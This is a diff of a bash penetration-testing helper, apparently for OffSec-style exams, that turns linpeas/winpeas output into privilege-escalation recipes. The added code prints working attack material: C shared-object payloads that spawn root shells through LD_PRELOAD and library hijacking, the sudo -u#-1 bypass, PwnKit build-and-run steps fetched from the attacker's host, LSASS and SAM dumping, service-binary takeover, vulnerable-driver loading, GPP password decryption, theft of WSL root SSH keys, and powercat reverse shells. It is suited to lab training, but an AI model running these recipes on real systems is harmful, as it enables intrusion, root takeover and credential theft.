@@ -63,6 +63,10 @@ SERVE_TIMEOUT=1800                         # Auto-stop HTTP server after 30 min 
 REMOTE_TMP="/tmp"                            # Remote writable dir (override with --remote-tmp if /tmp is noexec)
 OFFLINE_MODE=false                           # --offline skips network, cache-only
 
+# Absolute directory of this script — used to emit PWD-independent commands
+# that reference sibling scripts (sprayr.sh, crackr.sh, pivotr.sh).
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
 # Tool URLs — verified as of March 2026
 LINPEAS_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 LINPEAS_FAT_URL="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"
@@ -628,6 +632,9 @@ whoami /priv
 # SeDebugPrivilege → procdump lsass / migrate to SYSTEM process
 # SeManageVolumePrivilege → SeManageVolumeExploit → DLL hijack → SYSTEM
 # SeRestorePrivilege → overwrite service binary
+# SeLoadDriverPrivilege → load vulnerable signed driver (Capcom, dbutil_2_3.sys) for kernel EoP
+# SeTakeOwnershipPrivilege → takeown + icacls any SYSTEM file → overwrite service binary
+# SeAssignPrimaryTokenPrivilege → same Potato chain as SeImpersonate (often on Service accounts)
 
 ### 1b. Stored credentials ###
 cmdkey /list
@@ -712,8 +719,24 @@ Get-ChildItem -Path C:\ -Include Unattend.xml,unattend.xml,sysprep.xml,sysprep.i
 ### AutoLogon registry (cleartext password) ###
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultPassword DefaultUserName AutoAdminLogon"
 
+### GPP — Groups.xml in SYSVOL (MS14-025, still in old domains) ###
+# Search local SYSVOL cache + any mapped share:
+Get-ChildItem -Path C:\ -Include Groups.xml,Services.xml,ScheduledTasks.xml,Printers.xml,DataSources.xml,Drives.xml -File -Recurse -ErrorAction SilentlyContinue 2>nul
+findstr /S /I cpassword C:\*.xml 2>nul
+# Any cpassword="..." value → exfil to Kali and run:
+#   gpp-decrypt "<CPASSWORD>"       (comes with Kali's gpp-decrypt package)
+
 ### Documents (may contain passwords) ###
 Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 2>nul
+
+### WSL — may expose root-on-Linux escape ###
+wsl --list --verbose 2>nul
+# If a distro is installed, try entering as root:
+wsl -u root -- /bin/bash
+# On WSL 1 the Linux filesystem is fully exposed at:
+#   C:\Users\<USER>\AppData\Local\Packages\<Distro>\LocalState\rootfs\
+# Host files writable from WSL: /mnt/c/... (with same user privileges, but note: root inside WSL = SYSTEM is NOT implied)
+# Historic CVE: CVE-2019-0571 (WSL privilege escalation) — rare on modern builds.
 
 #----------------------------------------------------------------------
 # PHASE 4: NETWORK & SERVICES
@@ -884,6 +907,11 @@ parse_linux_output() {
         grep -iE "Linux version|uname|kernel" "$input_file" 2>/dev/null | head -5
         echo ""
 
+        # 10b. pkexec / polkit version (PwnKit = CVE-2021-4034)
+        echo "=== PKEXEC / POLKIT VERSION ==="
+        grep -iE "pkexec.*version|polkit.*version|policykit" "$input_file" 2>/dev/null | head -5
+        echo ""
+
         # 11. linpeas RED/YELLOW highlights
         echo "=== LINPEAS HIGH-PRIORITY (RED/YELLOW) ==="
         grep -E "\[1;31m|\[1;33m|95%|99%" "$input_file" 2>/dev/null | head -30
@@ -904,6 +932,21 @@ parse_linux_output() {
         echo "  GTFObins: https://gtfobins.github.io/"
         echo "============================================================"
         echo ""
+
+        # sudo CVE-2019-14287 — (ALL, !root) runas_spec bypass (sudo < 1.8.28)
+        # If a user can run any command as any user EXCEPT root, the negation
+        # can be bypassed with a UID of -1 (interpreted as 0 = root).
+        if grep -qE '\(ALL\s*,?\s*!root\)|\(\s*[^)]*\s*,\s*!root\s*\)' "$quickwins" 2>/dev/null; then
+            echo "[ SUDO CVE-2019-14287 — (ALL, !root) bypass ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: sudoers entry matches (ALL, !root) or similar negation"
+            echo "# sudo < 1.8.28 treats -u#-1 as UID 0 (= root), bypassing !root"
+            echo "sudo --version  # confirm < 1.8.28"
+            echo "sudo -u#-1 /bin/bash"
+            echo "# Or for specific NOPASSWD binary (replace /bin/id):"
+            echo "sudo -u#-1 /bin/id"
+            echo ""
+        fi
 
         # Sudo NOPASSWD → exploit commands
         local sudo_entries
@@ -1067,34 +1110,100 @@ parse_linux_output() {
             echo "searchsploit linux kernel ${kernel_ver%.*}"
             echo "# Common high-value: DirtyPipe (5.8-5.16), PwnKit (pkexec), Baron Samedit (sudo < 1.9.5p2)"
             echo "# Run les.sh on target: ./les.sh 2>/dev/null | head -40"
-            echo "# Last resort only — unstable exploits can crash the target"
+            echo "# *** CRASH RISK *** kernel exploits can panic the VM — use LAST"
             echo ""
         fi
 
-        # LD_PRELOAD / shared object hijack
-        if grep -qiE 'LD_PRELOAD|LD_LIBRARY_PATH|env_keep.*LD|\.so.*writable|shared object|RPATH' "$quickwins" 2>/dev/null; then
-            echo "[ SHARED OBJECT / LD_PRELOAD HIJACK ]"
+        # PwnKit (CVE-2021-4034) — pkexec present on most pre-Feb-2022 distros
+        if grep -qiE 'pkexec|polkit|policykit' "$quickwins" 2>/dev/null; then
+            echo "[ PWNKIT — CVE-2021-4034 (pkexec local root) ]"
             echo "------------------------------------------------------------"
-            echo "# Compile malicious shared library:"
+            echo "# Evidence: pkexec / polkit present in output"
+            echo "# Manual PoC (no MSF). Pick one:"
+            echo "#   https://github.com/arthepsy/CVE-2021-4034     (1-file C PoC)"
+            echo "#   https://github.com/ly4k/PwnKit              (single binary PoC)"
+            echo ""
+            echo "# Compile on Kali (musl-static for portability):"
+            echo "gcc -Wall -s -o pwnkit cve-2021-4034.c"
+            echo ""
+            echo "# Transfer + run:"
+            echo "# (via escalatr HTTP: wget http://<KALI_IP>:<PORT>/pwnkit -O /tmp/pwnkit && chmod +x /tmp/pwnkit)"
+            echo "/tmp/pwnkit"
+            echo "# → you should land in a root shell immediately"
+            echo ""
+            echo "# Patched if: polkit >= 0.120-2 / pkexec sources mention CVE-2021-4034"
+            echo ""
+        fi
+
+        # LD_PRELOAD hijack — sudo env_keep or SUID with preserved env
+        if grep -qiE 'LD_PRELOAD|env_keep.*LD_PRELOAD' "$quickwins" 2>/dev/null; then
+            echo "[ LD_PRELOAD HIJACK — sudo env_keep=LD_PRELOAD ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: env_keep+=LD_PRELOAD in sudo -l output"
+            echo "# Constructor runs as root when sudo invokes the allowed command."
             cat << 'CEOF'
-# shell.c:
-#include <stdio.h>
+# /tmp/preload.c:
 #include <stdlib.h>
 #include <unistd.h>
-void __attribute__((constructor)) init() {
+void __attribute__((constructor)) pwn() {
+    unsetenv("LD_PRELOAD");
     setuid(0); setgid(0);
     system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
 }
 CEOF
-            echo "gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c -nostartfiles"
+            echo "gcc -shared -fPIC -nostartfiles -o /tmp/preload.so /tmp/preload.c"
             echo ""
-            echo "# If sudo env_keep+=LD_PRELOAD:"
-            echo "sudo LD_PRELOAD=/tmp/shell.so <ALLOWED_CMD>"
-            echo "# Then: /tmp/rootbash -p"
+            echo "# Trigger (use any NOPASSWD command):"
+            echo "sudo LD_PRELOAD=/tmp/preload.so <ALLOWED_CMD>"
+            echo "/tmp/rootbash -p"
             echo ""
-            echo "# If SUID binary loads .so from writable dir:"
-            echo "# Find missing .so: strace <SUID_BIN> 2>&1 | grep 'No such file'"
-            echo "# Drop compiled shell.so at the missing path"
+        fi
+
+        # LD_LIBRARY_PATH hijack — sudo env_keep or ELF with RPATH/RUNPATH
+        if grep -qiE 'LD_LIBRARY_PATH|env_keep.*LD_LIBRARY_PATH|RPATH|RUNPATH' "$quickwins" 2>/dev/null; then
+            echo "[ LD_LIBRARY_PATH HIJACK — env_keep or RPATH-writable ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: env_keep+=LD_LIBRARY_PATH or SUID binary with writable RPATH"
+            echo "# Find what shared libs the target loads:"
+            echo "ldd /path/to/target_binary"
+            echo "# Pick one of the needed libraries (e.g. libcrypto.so.1.1)"
+            cat << 'CEOF'
+# /tmp/hijack.c — replicate the same so-name the binary expects:
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) pwn() {
+    setuid(0); setgid(0);
+    system("/bin/bash -p");
+}
+CEOF
+            echo "gcc -shared -fPIC -o /tmp/libcrypto.so.1.1 /tmp/hijack.c"
+            echo ""
+            echo "# Trigger:"
+            echo "sudo LD_LIBRARY_PATH=/tmp <ALLOWED_CMD>"
+            echo ""
+        fi
+
+        # SUID binary loading .so from writable dir — no env_keep needed
+        if grep -qiE '\.so.*writable|shared object.*writable|writable.*\.so' "$quickwins" 2>/dev/null; then
+            echo "[ SUID SHARED OBJECT — writable .so path ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: SUID binary loads .so from a path writable by current user"
+            echo "# Discover missing / writable libs:"
+            echo "strace <SUID_BIN> 2>&1 | grep -E 'open.*\\.so|No such file'"
+            echo "readelf -d <SUID_BIN> | grep -E 'RPATH|RUNPATH|NEEDED'"
+            echo ""
+            echo "# Compile a replacement .so with a constructor that spawns a root shell:"
+            cat << 'CEOF'
+# /tmp/libhijack.c:
+#include <stdlib.h>
+#include <unistd.h>
+void __attribute__((constructor)) pwn() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-p", NULL);
+}
+CEOF
+            echo "gcc -shared -fPIC -o /path/to/writable/<NEEDED_LIB>.so /tmp/libhijack.c"
+            echo "<SUID_BIN>  # → root shell"
             echo ""
         fi
 
@@ -1129,10 +1238,10 @@ CEOF
             done <<< "${cred_file_hits}"
             echo ""
             echo "# Validate immediately:"
-            echo "./sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
+            echo "${SCRIPT_DIR}/sprayr.sh -u <USER> -p '<FOUND_PASSWORD>' -t <TARGET_IP>"
             echo "# OR hash-spray after cracking:"
-            echo "./crackr.sh -H '<HASH_IF_HASHED>' -q"
-            echo "./sprayr.sh --from-creds"
+            echo "${SCRIPT_DIR}/crackr.sh -H '<HASH_IF_HASHED>' -q"
+            echo "${SCRIPT_DIR}/sprayr.sh --from-creds"
             echo ""
         fi
 
@@ -1146,7 +1255,7 @@ CEOF
                 [[ -z "${port}" ]] && continue
                 echo "# Port ${port}:"
                 echo "ssh -N -L 127.0.0.1:${port}:127.0.0.1:${port} <USER>@<TARGET_IP>"
-                echo "# OR: ./pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip <TARGET_IP>"
+                echo "# OR: ${SCRIPT_DIR}/pivotr.sh ssh --type local --local-port ${port} --target-ip 127.0.0.1 --target-port ${port} --pivot-ip <TARGET_IP>"
             done <<< "${internal_ports}"
             echo ""
         fi
@@ -1187,7 +1296,7 @@ parse_windows_output() {
 
         # 1. Token privileges
         echo "=== TOKEN PRIVILEGES ==="
-        grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume|SeAssignPrimary|SeTakeOwnership|SeLoad" "$input_file" 2>/dev/null | head -10
+        grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume|SeAssignPrimaryToken|SeTakeOwnership|SeLoadDriver|SeCreateToken|SeTcb" "$input_file" 2>/dev/null | head -15
         echo ""
 
         # 2. Stored credentials
@@ -1225,6 +1334,16 @@ parse_windows_output() {
         grep -iE "password[[:space:]]*[=:]|DefaultPassword|AutoLogon|AutoAdminLogon|Unattend|sysprep" "$input_file" 2>/dev/null | head -15
         echo ""
 
+        # 7b. GPP Groups.xml / cpassword leaks (MS14-025)
+        echo "=== GPP / GROUPS.XML (cpassword) ==="
+        grep -iE "Groups\.xml|cpassword|Services\.xml|ScheduledTasks\.xml|Drives\.xml|DataSources\.xml" "$input_file" 2>/dev/null | head -10
+        echo ""
+
+        # 7c. WSL detection (potential cross-OS pivot)
+        echo "=== WSL / LINUX SUBSYSTEM ==="
+        grep -iE "wsl\.exe|WindowsSubsystemForLinux|\\\\wsl\$|LxssManager" "$input_file" 2>/dev/null | head -5
+        echo ""
+
         # 8. PowerShell history content
         echo "=== POWERSHELL HISTORY CONTENT ==="
         grep -iA2 "ConsoleHost_history\|PSReadline" "$input_file" 2>/dev/null | head -10
@@ -1254,10 +1373,25 @@ parse_windows_output() {
         echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
         echo "============================================================"
         echo ""
+        echo "# ───────────────────────────────────────────────────────────"
+        echo "# OffSec RULE: Metasploit (msfvenom / msfconsole / meterpreter)"
+        echo "# is limited to ONE target across the entire engagement."
+        echo "# Many recipes below use msfvenom for convenience."
+        echo "# Manual alternatives (no MSF):"
+        echo "#   - PE revshell: x86_64-w64-mingw32-gcc revshell.c -o rev.exe"
+        echo "#     (compile Adam Chester-style C revshell, or use nim/golang)"
+        echo "#   - PowerShell: Invoke-PowerShellTcp.ps1 (nishang) or"
+        echo "#     powercat -c <KALI> -p 4444 -e powershell"
+        echo "#   - MSI: WixSharp, or hand-roll WiX XML + candle.exe/light.exe"
+        echo "#   - DLL revshell: x86_64-w64-mingw32-gcc -shared revshell.c -o r.dll"
+        echo "# Reserve your MSF shot for the one target that absolutely needs"
+        echo "# it (typically the buffer-overflow / legacy MS17-010 machine)."
+        echo "# ───────────────────────────────────────────────────────────"
+        echo ""
 
         # Token privileges → Potato selection
         local token_privs
-        token_privs=$(grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume" "$quickwins" 2>/dev/null)
+        token_privs=$(grep -iE "SeImpersonate|SeBackup|SeDebug|SeRestore|SeManageVolume|SeAssignPrimaryToken|SeTakeOwnership|SeLoadDriver" "$quickwins" 2>/dev/null)
         if [[ -n "${token_privs}" ]]; then
             echo "[ TOKEN PRIVILEGES ]"
             echo "------------------------------------------------------------"
@@ -1268,17 +1402,56 @@ parse_windows_output() {
                 echo "# Broad fallback: GodPotato-NET4.exe -cmd 'cmd /c whoami'"
                 echo "# Missing privs first? FullPowers.exe -c \"cmd.exe /c whoami\" -z"
             fi
+            if echo "${token_privs}" | grep -qi "SeAssignPrimaryToken"; then
+                echo "# SeAssignPrimaryToken — same Potato chain as SeImpersonate:"
+                echo "# Often seen on SERVICE accounts without SeImpersonate — same tools work."
+                echo "# PrintSpoofer / SigmaPotato / GodPotato all succeed when either priv is present."
+            fi
             if echo "${token_privs}" | grep -qi "SeBackup"; then
                 echo "# SeBackup — dump SAM/SYSTEM hive:"
                 echo "reg save HKLM\\SAM C:\\Temp\\sam.hive"
                 echo "reg save HKLM\\SYSTEM C:\\Temp\\sys.hive"
                 echo "# Exfil to Kali then: impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
+                echo "# PowerShell alt (no restart needed):"
+                echo "Get-Acl -Path HKLM:\\SAM  # confirm access"
+            fi
+            if echo "${token_privs}" | grep -qi "SeRestore"; then
+                echo "# SeRestore — overwrite any file including SYSTEM-owned binaries:"
+                echo "# Example: replace a service binary that runs as SYSTEM."
+                echo "# Use robocopy /B or python win32file CreateFile with BACKUP_SEMANTICS."
+                echo "# Combined with SeBackup: full write access to SAM/SYSTEM/SECURITY hives."
+            fi
+            if echo "${token_privs}" | grep -qi "SeTakeOwnership"; then
+                echo "# SeTakeOwnership — take ownership of any file, then grant yourself write:"
+                echo "# Pick a SYSTEM-owned binary that runs elevated (service .exe, scheduled task):"
+                echo "takeown /f C:\\Path\\To\\target.exe"
+                echo "icacls C:\\Path\\To\\target.exe /grant %USERNAME%:F"
+                echo "# Overwrite with payload (manual PE revshell — see MSF-limit banner):"
+                echo "copy rev.exe C:\\Path\\To\\target.exe /y"
+                echo "# Trigger: restart service / wait for schtask / reboot"
+            fi
+            if echo "${token_privs}" | grep -qi "SeLoadDriver"; then
+                echo "# SeLoadDriver — load a vulnerable signed driver for kernel EoP:"
+                echo "# Typical flow: Capcom.sys, dbutil_2_3.sys (CVE-2021-21551), kprocesshacker,"
+                echo "# or any driver in https://loldrivers.io/"
+                echo "#   1. Drop driver on disk (e.g. C:\\Temp\\dbutil.sys)"
+                echo "#   2. Use EoPLoadDriver.exe (tandasat) or a PowerShell loader:"
+                echo "#      https://github.com/tandasat/ExploitCapcom / EoPLoadDriver"
+                echo "#   3. Exploit the loaded driver's IOCTL to elevate token"
+                echo "# *** CRASH RISK *** — drivers can BSOD the target. Use LAST RESORT."
             fi
             if echo "${token_privs}" | grep -qi "SeDebug"; then
                 echo "# SeDebug — dump LSASS:"
                 echo "# Option A: Task Manager → Details → lsass.exe → Create Dump File"
                 echo "# Option B: procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+                echo "# Option C (MiniDumpWriteDump via PowerShell, no procdump needed):"
+                echo "#   Get-Process lsass | Out-Minidump (PowerSploit / pypykatz offline parse)"
                 echo "# Exfil + parse: impacket-secretsdump -just-dc-ntlm -outputfile hashes -ntds lsass.dmp LOCAL"
+                echo "# Or: pypykatz lsa minidump lsass.dmp"
+            fi
+            if echo "${token_privs}" | grep -qi "SeManageVolume"; then
+                echo "# SeManageVolume — writable C:\\Windows\\System32 via SeManageVolumeExploit:"
+                echo "# See separate [ SeManageVolumePrivilege ] block below for full recipe."
             fi
             echo ""
         fi
@@ -1403,7 +1576,7 @@ parse_windows_output() {
             echo ""
             echo "# Validate immediately:"
             echo "# Spray the password:"
-            echo "./sprayr.sh -u <DefaultUserName> -p '<DefaultPassword>' -t <TARGET_IP>"
+            echo "${SCRIPT_DIR}/sprayr.sh -u <DefaultUserName> -p '<DefaultPassword>' -t <TARGET_IP>"
             echo ""
             echo "# Use with RunasCs if you can't PTH:"
             echo ".\\RunasCs.exe <DefaultUserName> '<DefaultPassword>' cmd.exe"
@@ -1422,7 +1595,7 @@ parse_windows_output() {
             echo "Select-String -Path \$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt -Pattern 'pass|secret|cred|token|-p |password'"
             echo ""
             echo "# If plaintext creds found → spray:"
-            echo "./sprayr.sh -u <USER> -p '<FOUND_PASS>' -t <TARGET_IP>"
+            echo "${SCRIPT_DIR}/sprayr.sh -u <USER> -p '<FOUND_PASS>' -t <TARGET_IP>"
             echo ""
         fi
 
@@ -1434,11 +1607,51 @@ parse_windows_output() {
             echo "Get-ChildItem -Path C:\\ -Recurse -Include *.kdbx -ErrorAction SilentlyContinue"
             echo ""
             echo "# 2. Exfil to Kali, then crack master password:"
-            echo "./crackr.sh -e keepass -f /tmp/db.kdbx -q"
-            echo "# OR: keepass2john db.kdbx > kp.hash && ./crackr.sh -f kp.hash -q"
+            echo "${SCRIPT_DIR}/crackr.sh -e keepass -f /tmp/db.kdbx -q"
+            echo "# OR: keepass2john db.kdbx > kp.hash && ${SCRIPT_DIR}/crackr.sh -f kp.hash -q"
             echo ""
             echo "# 3. Open database (once cracked):"
             echo "kpcli --kdb db.kdbx  # Kali: sudo apt install kpcli"
+            echo ""
+        fi
+
+        # GPP Groups.xml / cpassword (MS14-025)
+        if grep -qiE 'cpassword|Groups\.xml|Services\.xml|ScheduledTasks\.xml' "$quickwins" 2>/dev/null; then
+            echo "[ GPP GROUPS.XML — cpassword (MS14-025) ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: Groups.xml / Services.xml / cpassword found in loot"
+            echo "# Microsoft published the AES key in 2012 — any cpassword is trivially decryptable."
+            echo "# 1. Extract the cpassword value from the XML:"
+            echo "findstr /S /I cpassword C:\\*.xml"
+            echo ""
+            echo "# 2. On Kali, decrypt with gpp-decrypt:"
+            echo "gpp-decrypt '<CPASSWORD_VALUE>'"
+            echo ""
+            echo "# 3. Validate immediately — these are often local admin creds:"
+            echo "${SCRIPT_DIR}/sprayr.sh -u '<USERNAME_FROM_XML>' -p '<DECRYPTED_PASSWORD>' -t <TARGET_IP>"
+            echo ""
+        fi
+
+        # WSL detection — cross-OS pivot / root on Linux
+        if grep -qiE 'wsl|WindowsSubsystemForLinux|LxssManager' "$quickwins" 2>/dev/null; then
+            echo "[ WSL — WINDOWS SUBSYSTEM FOR LINUX ]"
+            echo "------------------------------------------------------------"
+            echo "# Evidence: WSL installed / referenced in enum output"
+            echo "# Enumerate installed distros:"
+            echo "wsl --list --verbose"
+            echo ""
+            echo "# If a distro is installed, jump into it as root (no password needed):"
+            echo "wsl -u root -- /bin/bash"
+            echo "# From inside WSL, the Windows drives are at /mnt/c, /mnt/d, etc."
+            echo "# Note: root inside WSL != SYSTEM on Windows."
+            echo "# But: any credentials, SSH keys, .bash_history inside the distro root are yours."
+            echo ""
+            echo "# WSL 1 — raw access to the distro filesystem (if you have local filesystem write):"
+            echo "# C:\\Users\\<USER>\\AppData\\Local\\Packages\\<DistroPkg>\\LocalState\\rootfs\\"
+            echo ""
+            echo "# If WSL is running a sshd, you may pivot through it with ssh keys from /root or /home:"
+            echo "wsl -u root -- cat /root/.ssh/id_rsa 2>/dev/null"
+            echo "wsl -u root -- cat /root/.ssh/authorized_keys 2>/dev/null"
             echo ""
         fi
 
@@ -1541,14 +1754,25 @@ EOF
   │    Win8-11/Srv2012-2022: SigmaPotato.exe               │
   │    Broad fallback: GodPotato-NET4.exe                  │
   │    Missing privs? FullPowers.exe first!                │
+  │  SeAssignPrimaryToken → same Potato chain as above     │
   │  SeBackup       → reg save SAM/SYSTEM → secretsdump   │
-  │  SeDebug        → procdump lsass → mimikatz offline    │
+  │  SeRestore      → overwrite SYSTEM-owned files         │
+  │  SeTakeOwnership → takeown + icacls → replace service  │
+  │  SeDebug        → procdump lsass → pypykatz offline    │
   │  SeManageVolume → SeManageVolumeExploit → DLL hijack   │
+  │  SeLoadDriver   → vuln signed driver (loldrivers.io)   │
+  │                   *** CRASH RISK — last resort ***     │
   └────────────────────────────────────────────────────────┘
   ┌─ Stored Creds ─────────────────────────────────────────┐
   │  cmdkey /list → runas /savecred /user:X cmd.exe        │
   │  PS history → ConsoleHost_history.txt                  │
   │  web.config, *.ini, *.xml, *.kdbx                     │
+  │  GPP Groups.xml cpassword (MS14-025) → gpp-decrypt     │
+  └────────────────────────────────────────────────────────┘
+  ┌─ WSL (if present) ─────────────────────────────────────┐
+  │  wsl --list → wsl -u root -- /bin/bash                 │
+  │  Check /root/.ssh/ and /home/*/.ssh for pivot keys     │
+  │  Note: root in WSL ≠ SYSTEM on Windows                 │
   └────────────────────────────────────────────────────────┘
   ┌─ Service Misconfig ────────────────────────────────────┐
   │  Writable binary (icacls: F/M)  → replace + restart   │
@@ -1678,8 +1902,10 @@ ${BOLD}OPTIONS:${NC}
   --commands linux|windows   Print privesc command cheatsheet
   --potato               Print potato variant selection guide
   --no-stage             Skip tool download/staging
+  --offline              Use cached tools only — no network fetch
   --port <N>             HTTP server port (default: $HTTP_PORT)
   --remote-tmp <path>    Writable dir on target (default: /tmp; use if /tmp is noexec)
+  --no-color             Disable ANSI colors (also via NO_COLOR=1 env)
   -h, --help             Show this help
 
 ${BOLD}EXAMPLES:${NC}
@@ -1688,8 +1914,12 @@ ${BOLD}EXAMPLES:${NC}
   ./escalatr.sh --parse /tmp/linpeas_output.txt --os linux
   ./escalatr.sh --commands windows
   ./escalatr.sh --serve 192.168.50.100 --os linux
+  ./escalatr.sh 192.168.50.100 --os linux --offline   # cached tools only
 
 ${BOLD}NOTE:${NC} This script is ENUMERATION ONLY — no auto-exploitation.
+${BOLD}OffSec:${NC} Metasploit usage is limited to 1 target across the engagement.
+      Windows attack_commands.txt includes a MSF-limit banner + manual
+      (mingw32-gcc / nishang / powercat) alternatives where feasible.
 EOF
 }
 
